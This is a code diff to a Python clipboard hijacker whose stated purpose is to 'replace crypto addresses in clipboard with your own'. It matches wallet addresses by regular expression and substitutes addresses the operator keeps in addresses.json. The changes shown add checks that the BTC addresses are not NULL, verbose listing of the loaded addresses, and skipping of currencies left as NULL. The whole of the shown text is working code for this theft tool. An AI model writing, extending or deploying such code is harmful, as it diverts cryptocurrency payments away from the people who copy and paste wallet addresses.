@@ -4,14 +4,12 @@ import argparse
 import json
 import time
 import sys
+import pprint
 
 parser = argparse.ArgumentParser(
     description="Replace crypto addresses in clipboard with your own")
 parser.add_argument("--verbose", help="Get more details", action='store_true')
 args = parser.parse_args()
-
-if args.verbose:
-    print("Watching Clipboard...")
 
 # name of crypto matched to regex to find it.
 cryptos = {'legacy_btc': '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',
@@ -26,6 +24,19 @@ cryptos = {'legacy_btc': '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',
 # reads in the addresses.json file provided by user and creates dic
 with open('addresses.json') as f:
     addresses = json.load(f)
+    if addresses['legacy_btc'] == "NULL" and addresses['segwit_btc'] == "NULL":
+        print("BTC address can't be set to null!")
+        sys.exit()
+    elif addresses['legacy_btc'] == "NULL" or addresses['segwit_btc'] == "NULL":
+        print("BTC address can't be set to null!")
+        sys.exit()
+
+
+if args.verbose:
+    print("I have loaded in the following addresses (ignoring NULL): ")
+    for k, v in addresses.items():
+        if v != "NULL":
+            print(f'{k}:{v}')
 
 
 def check(pasted):
@@ -35,7 +46,7 @@ def check(pasted):
     try:
         # checks to see if the clipboard contains a address
         for crypto, crypto_re in cryptos.items():
-            if bool(re.search(crypto_re, pasted.strip())):
+            if bool(re.search(crypto_re, pasted.strip())) and addresses[crypto] != 'NULL':
                 if args.verbose:
                     print(
                         f"Found {crypto} in clipboard ({pasted})")
